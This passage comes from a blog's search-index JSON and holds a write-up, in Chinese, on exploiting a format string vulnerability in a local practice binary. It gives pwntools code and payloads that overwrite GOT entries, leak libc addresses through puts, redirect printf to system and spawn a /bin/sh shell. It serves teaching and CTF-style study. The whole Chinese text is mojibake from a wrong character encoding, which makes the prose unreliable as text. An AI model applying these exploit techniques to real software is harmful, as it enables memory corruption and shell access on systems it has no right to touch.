¼å¼åŒ–çš„æ•°æ®å†™å…¥æŸä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œæ§åˆ¶å­—ç¬¦ä¸²é•¿åº¦ï¼›\næ ¼å¼ï¼š\n1 int snprintf(char *str,size_t size,const char *format,[argument]...) åœ¨sprintfçš„åŸºç¡€ä¸Šé™åˆ¶äº†å¯å†™å…¥å­—ç¬¦çš„æœ€å¤§å€¼sizeï¼› å½“æ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦=sizeï¼Œåˆ™å°†å…¶ä¸­çš„size-1ä¸ªå­—ç¬¦å¤åˆ¶åˆ°strä¸­ï¼Œå¹¶åœ¨æœ€åæ·»åŠ å­—ç¬¦ä¸²ç»“æŸç¬¦\\0ï¼› sprintf(buffer, 10,\u0026quot;Id=%d\u0026quot;, Id); fprintf åŠŸèƒ½ï¼šç”¨äºæ ¼å¼åŒ–è¾“å‡ºåˆ°ä¸€ä¸ªæµ/æ–‡ä»¶ä¸­ï¼›\næ ¼å¼ï¼š\n1 int fprintf(FILE *stream,const char *format,[argument]...) æ ¹æ®æŒ‡å®šçš„æ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²formatå‘è¾“å‡ºæµstreamä¸­å†™å…¥æ•°æ®ï¼› å½“streamä¸ºstdoutæ—¶ï¼Œfprintfä¸printfçš„åŠŸèƒ½ç›¸åŒï¼› printf(pfile,\u0026quot;Id=%d\u0026quot;,Id); vprintf/vsprintf/vsnprintf/vfprintf åŠŸèƒ½åˆ†åˆ«å¯¹åº”äºprintf/sprintf/snprintf/fprintfï¼› å°†å˜å‚åˆ—è¡¨æ¢æˆäº†va_listç±»å‹çš„å‚æ•° æ ¼å¼ï¼š vprintf (format,va_list); vsprintf (buffer,format,va_list); vsnprintf (buffer,256,format,va_list); vfprintf(stream, format, va_list); æ ¼å¼åŒ–å­—ç¬¦ä¸² æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ç”±æ™®é€šå­—ç¬¦ä¸²å’Œæ ¼å¼åŒ–è§„å®šå­—ç¬¦æ„æˆçš„å­—ç¬¦åºåˆ—ï¼š\næ™®é€šå­—ç¬¦è¢«åŸå°ä¸åŠ¨åœ°å¤åˆ¶åˆ°è¾“å‡ºæµä¸­ï¼› æ ¼å¼åŒ–è§„å®šå­—ç¬¦åˆ™æ˜¯ä»¥%å¼€å§‹ï¼Œç”¨æ¥ç¡®å®šè¾“å‡ºå†…å®¹æ ¼å¼ï¼› åŸºæœ¬æ ¼å¼\n%[parameter][flags][fieldwidth][.precision][length]type\nparameter\nå¯ä»¥å¿½ç•¥æˆ–è€…æ˜¯n$ï¼Œnè¡¨ç¤ºæ˜¯å‚æ•°åˆ—è¡¨çš„ç¬¬nä¸ªå‚æ•°ï¼Œé€šè¿‡è¿™ç§å½¢å¼ç›´æ¥è®¿é—®ç¬¬nä¸ªå‚æ•°ï¼› flags\nç”¨äºè°ƒæ•´è¾“å‡ºå’Œæ‰“å°çš„ç¬¦å·ã€ç©ºç™½ã€å°æ•°ç‚¹ã€å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶å‰ç¼€ç­‰ï¼› fieldwidth\né™åˆ¶æ˜¾ç¤ºæ•°å€¼çš„æœ€å°å®½åº¦ï¼Œå½“è¾“å‡ºå­—ç¬¦ä¸ªæ•°ä¸è¶³é™åˆ¶çš„å®½åº¦æ—¶ï¼Œé»˜è®¤ç”¨ç©ºæ ¼å¡«å……ï¼Œæˆ–è€…flagsä¸­çš„å…¶ä»–å¡«å……æ–¹å¼ï¼Œè¶…è¿‡é™åˆ¶å®½åº¦ä¸ä¼šæˆªæ–­ï¼Œæ­£å¸¸æ˜¾ç¤ºï¼› precision\nè¾“å‡ºçš„æœ€å¤§é•¿åº¦ï¼› length\næŒ‡æµ®ç‚¹å‹å‚æ•°æˆ–è€…æ•´å½¢å‚æ•°çš„é•¿åº¦ï¼› hhï¼š1-byteï¼› hï¼š2-byteï¼› lï¼š4-byteï¼› llï¼š8-byteï¼› type\nè½¬æ¢è¯´æ˜ç¬¦ï¼Œç”¨æ¥è¯´æ˜æ‰€åº”ç”¨çš„è½¬æ¢ç±»å‹ï¼Œå®ƒæ˜¯å”¯ä¸€å¿…é¡»çš„æ ¼å¼åŸŸï¼›\n| å­—ç¬¦ | æè¿° | | â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” | | d/i | æœ‰ç¬¦å·åè¿›åˆ¶æ•´æ•° | | u | æ— ç¬¦å·åè¿›åˆ¶æ•´æ•° | | x/X | ä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºæ— ç¬¦å·æ•´æ•°(ä¸è¾“å‡ºå‰ç¼€0x) | | o | ä»¥å…«è¿›åˆ¶å½¢å¼è¾“å‡ºæ— ç¬¦å·æ•´æ•°(ä¸è¾“å‡ºå‰ç¼€0) | | s | å­—ç¬¦ä¸² | | c | å­—ç¬¦ | | p | æŒ‡é’ˆ | | n | ä¸è¾“å‡ºå­—ç¬¦ï¼ŒæŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ | | f/F | ä»¥å°æ•°å½¢å¼è¾“å‡ºå•ã€åŒç²¾åº¦å®æ•° | | e/E | ä»¥æŒ‡æ•°å½¢å¼è¾“å‡ºå•ã€åŒç²¾åº¦å®æ•° | | g/G | ä»¥%f%eä¸­è¾ƒçŸ­çš„è¾“å‡ºå®½åº¦è¾“å‡ºå•ã€åŒç²¾åº¦å®æ•°ï¼Œ%eæ ¼å¼åœ¨æŒ‡æ•°å°äº-4æˆ–è€…å¤§äºç­‰äºç²¾åº¦æ—¶ä½¿ç”¨ | | a/A | æµ®ç‚¹æ•°ã€åå…­è¿›åˆ¶æ•°å­—å’Œp-è®¡æ•°æ³• |\n0x03 æ¼æ´åŸç† æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ˜¯æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ¥è¿›è¡Œè§£æçš„ï¼Œé‚£ä¹ˆç›¸åº”çš„è¦è¢«è§£æçš„å‚æ•°çš„ä¸ªæ•°ä¹Ÿè‡ªç„¶æ˜¯ç”±è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€æ§åˆ¶ï¼›\næ ¹æ®cdeclçš„è°ƒç”¨çº¦å®šï¼Œåœ¨è¿›å…¥printf()å‡½æ•°ä¹‹å‰ï¼Œå°†å‚æ•°ä»å³åˆ°å·¦ä¾æ¬¡å‹æ ˆã€‚è¿›å…¥printf()ä¹‹å,å‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æœå­—ç¬¦ä¸æ˜¯%ï¼Œå­—ç¬¦ç›´æ¥å¤åˆ¶åˆ°è¾“å‡ºä¸­ï¼›å¦åˆ™ï¼Œè¯»å–ä¸‹ä¸€ä¸ªéç©ºå­—ç¬¦ï¼Œè·å–ç›¸åº”çš„å‚æ•°å¹¶è§£æè¾“å‡ºã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ä¸åé¢å®é™…æä¾›çš„æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå°±ä¸ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤šåŠ å‡ ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„æ—¶å€™ï¼Œç¨‹åºä¼šæ€ä¹ˆåŠå‘¢ï¼Ÿæ­¤æ—¶å…¶å¯ä»¥æ­£å¸¸é€šè¿‡ç¼–è¯‘ï¼Œå¹¶ä¸”åœ¨æ ˆä¸Šå–å€¼ï¼ŒæŒ‰ç…§ç»™çš„æ ¼å¼åŒ–å­—ç¬¦æ¥è§£æå¯¹åº”æ ˆä¸Šçš„å€¼ï¼Œå‘ç”Ÿäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚\n0x04 æ¼æ´åˆ†æ åˆ†æ ç”¨IDAProå¯¹format1ç¨‹åºè¿›è¡Œåˆ†æï¼Œç¨‹åºé€»è¾‘ç®€å•ï¼Œåœ¨mainå‡½æ•°ä¸­è°ƒç”¨äº†getnameå‡½æ•° æŸ¥çœ‹getname()å‡½æ•°ï¼Œè¯»å–ç”¨æˆ·è¾“å…¥ï¼Œå‘ç°print(buf)å°†ç”¨æˆ·è¾“å…¥è¿›è¡Œæ‰“å°ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ ç”±äºç¨‹åºç¼–è¯‘æ—¶ä¼šé‡‡ç”¨ä¸¤ç§è¡¨è¿›è¡Œè¾…åŠ©ï¼Œä¸€ä¸ªä¸ºPLTè¡¨ï¼Œä¸€ä¸ªä¸ºGOTè¡¨ï¼Œè¿™ä¸¤ä¸ªè¡¨æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œçœ‹åˆ°å¸¦æœ‰**@plt**æ ‡å¿—çš„å‡½æ•°æ—¶ï¼Œè¿™ä¸ªå‡½æ•°å…¶å®å°±æ˜¯ä¸ªè¿‡æ¸¡ä½œç”¨ï¼Œå¯ä»¥é€šè¿‡PLTè¡¨è·³è½¬åˆ°GOTè¡¨æ¥å¾—åˆ°å‡½æ•°çœŸæ­£çš„åœ°å€ï¼š åˆ©ç”¨æ€è·¯ å°†exitå‡½æ•°çš„GOTè¡¨åœ°å€è¦†å†™ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œç¨‹åºæ¯æ¬¡é€€å‡ºæ—¶å°†å†è¿”å›åˆ°mainå‡½æ•°ï¼› é€šè¿‡printfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè·å–putså‡½æ•°åœ°å€ï¼Œå†é€šè¿‡libcçš„ç›¸å¯¹åœ°å€åç§»è·å–systemçš„åœ°å€ï¼› ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå°†systemå‡½æ•°åœ°å€è¦†ç›–GOTè¡¨ä¸­printfå‡½æ•°çš„åœ°å€ï¼Œå¹¶åœ¨buf ä¸­å†™å…¥/bin/shï¼Œå½“æ‰§è¡Œprintf(buf)æ—¶ï¼Œç›¸å½“äºæ‰§è¡Œsystem('/bin/sh')ï¼› åˆ©ç”¨è¿‡ç¨‹ å°†exitå‡½æ•°çš„GOTè¡¨åœ°å€è¦†ç›–ä¸ºmainå‡½æ•°åœ°å€ å°†exitå‡½æ•°çš„GOTè¡¨åœ°å€è¦†å†™ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œæ¯æ¬¡é€€å‡ºæ—¶å°†å†è¿”å›åˆ°mainå‡½æ•°ã€‚ ï¶å…ˆè§£å†³æ„å»ºprintfï¼ˆformatï¼Œ[argument]ï¼‰ä¸­formatå’Œargument\nformatè¦†å†™çš„æ ¼å¼ä¸ºï¼š% width c % num $ hhn\nwidthæ˜¯å°†è¦å†™å…¥åˆ°$hhnå‚æ•°ä¸­çš„å€¼ï¼Œå®ƒç”±è¦†å†™çš„å€¼å’Œå·²ç»å†™å…¥çš„é•¿åº¦å†³å®šï¼Œå…·ä½“ä¸ºï¼šï¼ˆå·²å†™å…¥çš„é•¿åº¦-è¦†å†™çš„å€¼ï¼‰%0x80 æ ¹æ®åæ±‡ç¼–å¯ä»¥çœ‹åˆ°bufæ•°ç»„çš„é•¿åº¦ä¸º0x80 numå®šäº†è¦å†™å…¥çš„ç¬¬numä¸ªå‚æ•°ï¼Œé€šè¿‡è°ƒè¯•å…·ä½“åˆ†æä¸€ä¸‹ è¿™é‡Œç»™å‡ºä¸¤ç§æ–¹æ³•\nç”¨gdbè°ƒè¯•\nåœ¨mainå’Œprintfå¤„è®¾ç½®æ–­ç‚¹ã€‚ ç„¶åè¿è¡Œç¨‹åºï¼Œè¿è¡Œåˆ°printfåœ°æ–¹ bufçš„åœ°å€ä¸º0xffffd12c,æ˜¯printfä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬7ä¸ªå‚æ•°:å³(0xffffd12c - 0xffffd110 ) / 4 = 7 é€šè¿‡pwntoolsè¿›è¡ŒæŸ¥æ‰¾\nç®€å•çš„exp:\n1 2 3 4 5 6 7 8 from pwn import * context.log_level=\u0026#39;debug\u0026#39; p = process(\u0026#39;./format1\u0026#39;) payload = b\u0026#39;a\u0026#39; * 4 + b\u0026#39; \u0026#39; + b\u0026#39; %08x\u0026#39; * 20 print(payload) p.sendline(payload) p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) è¿è¡Œç»“æœå¦‚ä¸‹\næ˜æ˜¾çš„çœ‹åˆ°0x61616161å³ä¸ºç¬¬ä¸ƒä¸ªå‚æ•° numçš„ç¡®å®š\nå› ä¸ºè¦æŠŠexitçš„GOTåœ°å€è¦†å†™ä¸ºmainå‡½æ•°åœ°å€ï¼Œå³0x8048648ï¼Œæ‰€ä»¥åº”å†™å…¥å››ä¸ªå­—èŠ‚ï¼Œå³é‡å¤å››æ¬¡% width c % num $ hhnï¼› ç²—ç•¥ä¼°è®¡widthæœ€å¤šå ç”¨3ä¸ªå­—èŠ‚ï¼Œnumæœ€å¤šå ç”¨2ä¸ªå­—èŠ‚ï¼Œåˆ™æ¯ä¸ªæ ¼å¼% widthc % num $ hhnå ç”¨12ä¸ªå­—èŠ‚ï¼Œå››æ¬¡é‡å¤å…±48ä¸ªå­—èŠ‚ï¼Œå ç”¨48/4=12ä¸ªå‚æ•°ï¼› ç”±äºbufæ˜¯ä»ç¬¬7ä¸ªå‚æ•°å¼€å§‹ï¼Œå†™å…¥çš„åœ°å€ä»ç¬¬7+12=19ä¸ªå‚æ•°å¼€å§‹ï¼Œnumä¾æ¬¡ä¸º19ã€20ã€21ã€22ï¼› ç¡®å®šexit@gotçš„åœ°å€ï¼›\nè¿™é‡ŒåŒæ ·ç»™å‡ºä¸¤ç§æ–¹æ³• gdbæŸ¥çœ‹åæ±‡ç¼–æŒ‡ä»¤ å…ˆdisass mainæŸ¥çœ‹mainå‡½æ•°åœ°å€ å‘ç°exit@pltçš„åœ°å€ä¸º0x8048480 ç„¶åæŸ¥çœ‹disass 0x8048480çš„åæ±‡ç¼–ï¼Œå³è¿›å…¥exit@pltçš„å‡½æ•°å†…éƒ¨ jmpæ‰€å¯¹åº”çš„çš„åœ°å€å³ä¸ºexit@got ä¸º 0x804a024 ç›´æ¥å€Ÿç”¨gdbä¸­çš„gotå‘½ä»¤ exit@got ä¸º 0x804a024 mainå‡½æ•°åœ°å€\nç¬¬ä¸€æ¡å³ä¸ºmainå‡½æ•°åœ°å€ ï¼š 0x08048648 æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²:\nç¡®å®šäº†numå’Œwidthï¼Œä¹Ÿç¡®å®šäº†exitå‡½æ•°çš„gotè¡¨åœ°å€ä¸º0x804a024ï¼Œæ‰€ä»¥å°†è¦è¦†ç›–çš„exit@gotåœ°å€0x804a024ã€0x804a025ã€0x804a026ã€0x804a027ä¾æ¬¡å†™å…¥åˆ°ç¬¬19ã€20ã€21ã€22ä¸ªå‚æ•°ä¸­ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å°±æ„é€ å¥½äº†ï¼š\n1 %72c%19$hhn%62c%20$hhn%126c%21$hhn%4c%22$hhnaaaa\\x24\\xa0\\x04\\x08\\x25\\xa0\\x04\\x08\\x26\\xa0\\x04\\ x08\\x27\\xa0\\x04\\x08 ç¼–å†™generate_format(addr, value)å‡½æ•°æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œaddrä¸ºè¦è¦†å†™çš„åœ°å€ï¼Œvalueä¸ºè¦†å†™çš„å€¼ï¼Œå‡½æ•°ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def generate_format(addr,value): payload=\u0026#39;\u0026#39; # å·²å†™å…¥çš„é•¿åº¦ print_count = 0 addr_part = \u0026#39;\u0026#39; # range 4 çš„åŸå› æ˜¯ åœ°å€ä¸ºå››ä¸ªå­—èŠ‚ï¼Œå››ä¸ªå¾ªç¯å³å¯ç»“æŸã€‚ for i in range(4): if value \u0026gt;\u0026gt; (8*i) == 0: break one_byte = (value \u0026gt;\u0026gt; (8*i)) \u0026amp; 0xff # 0x100çš„åŸå›  é˜²æ­¢å‡ºç°è´Ÿæ•° payload += \u0026#39;%{0}c%{1}$hhn\u0026#39;.format((one_byte - print_count + 0x100) % 0x100,19+i) print_count += (one_byte - print_count) % 0x100 addr_part += p32(addr+i).decode(\u0026#39;unicode_escape\u0026#39;) payload = payload.ljust((12)*4,\u0026#39;a\u0026#39;) payload += addr_part return payload è°ƒç”¨generate_format(exit_got,main)å‡½æ•°ï¼Œç”Ÿæˆçš„payloadä½œä¸ºè¾“å…¥ï¼Œæ‰§è¡Œåå¯ä»¥çœ‹åˆ°exitçš„gotè¡¨çš„ç¬¬ä¸€ä¸ªåœ°å€è¢«è¦†ç›–ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œå³0x08048648ï¼› è·å–systemçš„åœ°å€ è·å–æ€è·¯åˆ†æ\nç”±äºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´èƒ½å¤Ÿæ³„éœ²å†…å­˜å…³é”®æ•°æ®ï¼Œå¯ä»¥è€ƒè™‘åˆ©ç”¨è¿™ä¸ªæ¼æ´æ³„éœ²system çš„åœ°å€ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ³„éœ²å‡ºGOTè¡¨ä¸­putsçš„åœ°å€ï¼Œå†åˆ©ç”¨libcä¸­systemå‡½æ•°ä¸putså‡½æ•°çš„åç§»ï¼Œè®¡ç®—å‡ºsystemåœ°å€ï¼› å…ˆè·å–putså‡½æ•°çš„gotè¡¨åœ°å€ï¼Œ(è¿™é‡Œä¸ä¸Šé¢çš„æ–¹æ³•ç›¸åŒ)ï¼Œæ‰€ä»¥putså‡½æ•°gotè¡¨çš„åœ°å€ä¸º0x804a01cï¼Œè™½ç„¶å¯ä»¥ç›´æ¥æŸ¥çœ‹0x804a01cå†…å®¹å³å¯å¾—åˆ°putså‡½æ•°çš„å®é™…åœ°å€ï¼Œè¿™é‡Œä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥è·å–ï¼›\næ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²\næ„é€ çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ ¼å¼ä¸ºï¼š%num$s+puts@gotï¼Œå³æŠŠputs@gotçš„åœ°å€å†™å…¥ bufï¼Œå†é€šè¿‡%sè¯»å‡ºï¼› æ­¤æ—¶è¯»å‡ºçš„putsåœ°å€ä¸º putsåœ¨ç¨‹åºä¸­çœŸæ­£è¿è¡Œçš„åœ°å€ å…¶ä¸­%num$så 4ä¸ªå­—èŠ‚ï¼Œæ˜¯ç¬¬7ä¸ªå‚æ•°ï¼›puts@gotå 4ä¸ªå­—èŠ‚ï¼Œæ˜¯ç¬¬8ä¸ªå‚æ•°ï¼Œnumå°±å¯ä»¥å†™ä¸º8ï¼Œå³å°†puts@gotçš„åœ°å€å†™å…¥åˆ°ç¬¬8ä¸ªå‚æ•°çš„ä½ç½®ï¼› è·å–äº†putsçš„å®é™…åœ°å€åï¼Œé€šè¿‡libcä¸­ä¸¤ä¸ªå‡½æ•°çš„åç§»å³å¯å¾—åˆ°systemçš„åœ°å€ï¼Œé€šè¿‡æŸ¥é˜…èµ„æ–™å¯ä»¥å¾—åˆ°libcçš„åº“çš„ä½ç½®ä¸º/lib/i386-linux-gnu/libc.so.6ï¼› æ‰€ä»¥get_sys_addr æœ‰å¦‚ä¸‹ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) puts_got_addr = elf.got[\u0026#34;puts\u0026#34;] payload_puts = \u0026#34;%8$s\u0026#34; + p32(puts_got_addr).decode(\u0026#39;unicode_escape\u0026#39;) p.sendline(payload_puts) p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) puts_addr = u32(p.recv(4)) libc = ELF(\u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34;) offset = libc.symbols[\u0026#39;puts\u0026#39;]-libc.symbols[\u0026#39;system\u0026#39;] sys_addr = puts_addr - offset è¿è¡Œç»“æœ\næ ¹æ®æ¥æ”¶åˆ°çš„å››ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ‹¿åˆ°putsåœ°å€ä¸º0xf7e37cd0,systemåœ°å€ä¸º0xf7e0b830 å°†å…¶æˆ‘ä»¬ç”¨gdbè°ƒè¯•å¾—åˆ°çš„åœ°å€ç›¸æ¯”ï¼Œæ­£ç¡® è¦†å†™got è¡¨ä¸­printfåœ°å€ åŸç†ä¸è¦†å†™exitå‡½æ•°GOTè¡¨ç›¸åŒï¼Œè°ƒç”¨generate_format(printf@got,system_addr)ï¼Œç”Ÿæˆçš„payloadä½œä¸ºè¾“å…¥ï¼Œä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 printf_got = elf.got[\u0026#39;printf\u0026#39;] payload_system = generate_format(printf_got,sys_addr) p.sendline(payload_system) è¿è¡Œä»£ç  å¯ä»¥å‘ç°printf@gotè¢«è¦†ç›–ä¸º0xf7e0b830 æ‰§è¡Œsystem(\u0026rsquo;/bin/sh') æ­¤æ—¶GOTè¡¨ä¸­printfåœ°å€å·²è¢«è¦†å†™ä¸ºsystemåœ°å€ï¼Œåœ¨bufä¸­è¾“å…¥/bin/shï¼Œæ‰§è¡Œprintf(buf)æ—¶ï¼Œç›¸å½“äºæ‰§è¡Œsystem('/bin/sh')ï¼Œæœ€åä»£ç å¦‚ä¸‹:\n1 2 3 4 p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) p.sendline(\u0026#34;/bin/sh\u0026#34;) p.interactive() è¿è¡Œç¼–å†™çš„pythonä»£ç ï¼ŒæˆåŠŸæ‹¿åˆ°shellæƒé™ï¼›\n0x05 æ€»ç»“ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å†…å­˜æ•°æ®å’Œè¦†å†™å†…å­˜ç†è§£åŠ æ·±ã€‚ Linuxä¸­gotè¡¨å’Œpltè¡¨çš„å…³ç³»è¿›ä¸€æ­¥ç†è§£ã€‚ pwntoolsæŸ¥çœ‹å‡½æ•°å‚æ•°çš„ä½ç½®çš„ä¸€äº›ç”¨æ³• pwntoolså¯ä»¥ç›´æ¥å¯¼å…¥elf,process,libcåº“ ","permalink":"http://www.reus09.top/posts/tech/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","summary":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ 0x01 ç›®çš„ é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æŒæ¡æ³„éœ²å†…å­˜æ•°æ®å’Œè¦†å†™å†…å­˜ã€‚ 0x02 åŸºç¡€çŸ¥è¯† æ ¼å¼åŒ–å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„ANSI Cå‡½æ•°ï¼Œå®ƒä»¬ä»æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­æå–å‚","title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²"},{"content":"","permalink":"http://www.reus09.top/about/","summary":"","title":"About"},{"content":"","permalink":"http://www.reus09.top/links/","summary":"","title":"Links"}]